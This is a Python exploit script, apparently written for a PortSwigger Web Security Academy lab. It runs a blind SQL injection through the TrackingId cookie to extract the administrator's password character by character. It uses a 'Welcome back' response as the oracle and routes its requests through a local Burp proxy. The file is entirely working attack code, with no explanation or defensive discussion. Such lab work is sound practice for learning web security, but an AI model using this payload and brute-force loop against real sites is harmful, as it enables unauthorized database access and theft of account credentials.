import requests

session = requests.session()
session.proxies = {'http': 'http://127.0.0.1:8080'}


burp0_url = "https://0a5f00f60355ed16c0597fa7001e006a.web-security-academy.net:443/filter?category=Gifts"
payload = "'%20UNION%20SELECT%20password%20from%20users%20where%20username%3d'administrator'%20and%20password%20like%20'{password}%25'--"




burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}


chars = ['A', 'a', 'B', 'b', 'C', 'c', 'D', 'd', 'E', 'e', 'F', 'f', 'G', 'g', 'H', 'h', 'I', 'i', 'J', 'j', 'K', 'k', 'L', 'l', 'M', 'm', 'N', 'n', 'O', 'o', 'P', 'p', 'Q', 'q', 'R', 'r', 'S', 's', 'T', 't', 'U', 'u', 'V', 'v', 'W', 'w', 'X', 'x', 'Y', 'y', 'Z', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '@' , '$', '#' ]#,'*' , '&' , '{' , '}' , '[' ']' , '–' , '=', '.' , '(' , ')' , ';' , '+', '‘' , '/' ]
curr = ""
tmp = ""
while True:
	print("Testing...")
	for char in chars:
		tmp += char
		burp0_cookies = {"TrackingId": payload.format(password=tmp), "session": "HokVY3lIJH5TDDBcDddQR0pVrj2UHO4l"}
		resp = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
		if 'Welcome back' in resp.text:
			curr += char
			print('found!' + char)
			print(curr)
			break
		else:
			tmp = curr

		


		
